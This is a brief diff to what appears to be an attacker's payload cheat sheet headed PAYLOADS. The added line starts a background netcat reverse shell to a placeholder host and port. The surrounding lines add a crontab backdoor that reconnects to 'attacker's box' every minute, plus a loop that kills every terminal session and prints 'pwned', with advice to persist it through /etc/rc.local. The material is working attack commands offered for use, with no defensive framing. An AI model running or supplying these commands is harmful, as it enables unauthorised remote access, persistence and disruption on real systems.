@@ -2,6 +2,8 @@
 ##	PAYLOADS
 ####################################
 
+nohup nc -c /bin/sh <host> <port> &
+
 crontab <<< "* * * * * nc -c /bin/sh <host> <port>"	// creates a nc backdoor, constantly tries to establish connection to attacker's box every 1 min
 
 while true; do for i in {1..7}; do who -p -u | grep -e tty -e pts| awk '{ print $6 }' | xargs -n1 kill -9; echo pwned > /dev/tty$i; done; sleep 0.1; done 2>/dev/null &	// Kills all terminal sessions.. consistently.. add this to /etc/rc.local to startup everytime.. nohup /etc/rc.local &
